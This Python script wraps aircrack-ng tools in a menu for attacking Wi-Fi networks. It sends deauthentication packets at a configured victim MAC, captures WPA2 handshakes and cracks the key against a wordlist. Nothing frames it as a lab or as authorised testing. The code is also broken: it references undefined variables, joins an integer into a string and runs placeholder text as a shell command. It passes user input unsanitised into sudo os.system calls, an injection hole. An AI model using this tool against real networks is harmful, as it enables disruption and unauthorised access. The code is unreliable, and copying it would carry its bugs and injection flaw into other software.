#!/bin/python
import sys
import os
import configparser

# Store user configuration
config = configparser.ConfigParser()

# Main script starts here
def main():
	# Check passed args
	if len(sys.argv) < 1:
		print("error: No configuration file provided\n")
		usage()
		sys.exit(1)

	# Open Config file
	configPath = None
	if len(sys.argv) > 2:
		configPath = sys.argv[2]
	else:
		configPath = sys.argv[1]
	config.read(configPath)

	# Initialize loop
	print("Using channel " + config['host']['channel'] + " on " + config['host']['nic'] + "\n")
	inputLoop()

def usage():
	if sys.platform == "win32":
		print("usage: python " + __file__ + "<C:\path\to\config>\n")
	else:
		print("usage: ./" + __file__ + " </path/to/config\n")

def inputLoop():
	command = "-1"
	menu()
	while command == "-1":
		command = input("> ")
		
		if command == "1":
			#Fire aireplay-ng
			deauth()
			command = "-1"
		elif command == "2":
			#Fire airmon-ng
			setPromisc()
			command = "-1"
		elif command == "3":
			#Fire airodump-ng
			capture()
			command = "-1"
		elif command == "4":
			#Fire aircrack-ng
			crack()
			command = "-1"
		elif command == "5":
			#Fire airmon-ng
			listDevices()
			command = "-1"
		elif command == "6":
			switchNIC()
			command = "-1"
		elif command == "?":
			usage()
			command = "-1"
		elif command == "quit" or command == "exit" or command == "e" or command == "q":
			break;
		else:
			menu()
			command = "-1"

	
def menu():
	print("1. Issue a deauthentication attack.")
	print("2. Set NIC to promiscous mode.")
	print("3. Capture an authentication packet.")
	print("4. Crack a WPA2 key.")
	print("5. List network interfaces.")
	print("6. Switch network interface")
	print("?  Usage")
	print("Enter one of the above commands:")

def deauth():
	#Aireplay command to send deauth packets
	bssid = config['ap']['bssid']
	target_mac = config['target']['mac']
	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + config['host']['nic']
	os.system(cmd)
	
def setPromisc():
	#Airmon command to set nic to promiscous
	if sys.platform == "win32":
		cmd = "idk how to escalate permissions in windows"
	else:
		cmd = "sudo airmon-ng start " +  config['host']['nic']
	os.system(cmd)

def listDevices():
	#Airmon command to list devices'
	if sys.platform == "win32":
		cmd = "idk how to escalate permissions in windows"
	else:
		cmd = "sudo airmon-ng"

	os.system(cmd)

def switchNIC():
	newNic = input("Enter NIC device name: ")
	if sys.platform == "win32":
		cmd = "idk how to escalate permissions in windows"
	else:
		cmd = "sudo airmon-ng stop " + config['host']['nic']
	runtimeData.userNic = command
	os.system(cmd)
	
def capture():
	#Airodump command to capture authentication traffic
	bssid = config['ap']['bssid']
	cap_file = input("Please specify a capture file to save to: ")
	cmd = "sudo airodump-ng -c " + int(config['host']['channel']) + " --bssid " + bssid + " -w " + cap_file + " " + config['host']['nic']
	os.system(cmd)
	
def crack():
	#Aircrack command to crack the key in the traffic dump
	word_list = config['host']['wordlist']
	bssid = config['ap']['bssid']
	cap_file = input("Please specify a capture file: ")
	cmd = "sudo aircrack-ng -w " + word_list + " -b " + bssid + " " + cap_file
	os.system(cmd)

if __name__ == '__main__':
    main()
 
